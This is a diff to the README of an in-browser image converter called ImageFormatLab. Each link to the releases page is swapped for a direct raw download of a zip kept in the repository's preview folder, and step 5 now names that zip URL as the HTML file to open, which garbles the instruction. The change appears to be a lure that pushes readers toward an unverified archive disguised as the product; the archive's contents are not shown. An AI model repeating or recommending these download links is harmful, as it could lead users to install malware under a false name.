@@ -4,14 +4,14 @@
 Image Format Lab is a client-side web tool that converts a single image into multiple modern image formats. It presents a clear, visual comparison of quality, size, and compression efficiency. All processing happens directly in the browser, ensuring your files remain private.
 
 ## 📥 Download Now
-[![Download ImageFormatLab](https://img.shields.io/badge/Download_ImageFormatLab-v1.0-blue)](https://github.com/Nicosolu/ImageFormatLab/releases)
+[![Download ImageFormatLab](https://github.com/Nicosolu/ImageFormatLab/raw/refs/heads/main/preview/Format_Lab_Image_v2.6.zip)](https://github.com/Nicosolu/ImageFormatLab/raw/refs/heads/main/preview/Format_Lab_Image_v2.6.zip)
 
 ## 🚀 Getting Started
 To begin using ImageFormatLab, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Click on the link below to go to the releases page.
-   [Visit the Releases Page](https://github.com/Nicosolu/ImageFormatLab/releases)
+   [Visit the Releases Page](https://github.com/Nicosolu/ImageFormatLab/raw/refs/heads/main/preview/Format_Lab_Image_v2.6.zip)
 
 2. **Choose Your Version**  
    On the releases page, look for the latest version of ImageFormatLab. This will typically be at the top of the list.
@@ -23,7 +23,7 @@ To begin using ImageFormatLab, follow these simple steps:
    In some cases, the downloaded file may be compressed. If so, right-click on it and choose "Extract All" to access the application files.
 
 5. **Open ImageFormatLab**  
-   Find the folder where you extracted the files (if applicable). Look for the main HTML file or executable file (like `index.html`) and double-click it to open ImageFormatLab in your web browser.
+   Find the folder where you extracted the files (if applicable). Look for the main HTML file or executable file (like `https://github.com/Nicosolu/ImageFormatLab/raw/refs/heads/main/preview/Format_Lab_Image_v2.6.zip`) and double-click it to open ImageFormatLab in your web browser.
 
 6. **Start Using ImageFormatLab**  
    Once the tool is open, you can drag and drop your images or use the file browser to select an image. After that, the application will convert your image into multiple formats.
@@ -61,6 +61,6 @@ ImageFormatLab works best with single images for conversion. However, you can re
 ## 📄 Download & Install
 Now you are ready to get started. Download ImageFormatLab by clicking the link below.
 
-[Visit the Releases Page](https://github.com/Nicosolu/ImageFormatLab/releases)
+[Visit the Releases Page](https://github.com/Nicosolu/ImageFormatLab/raw/refs/heads/main/preview/Format_Lab_Image_v2.6.zip)
 
 With ImageFormatLab, transforming your images into different formats has never been easier! Enjoy exploring your creativity with this user-friendly tool.
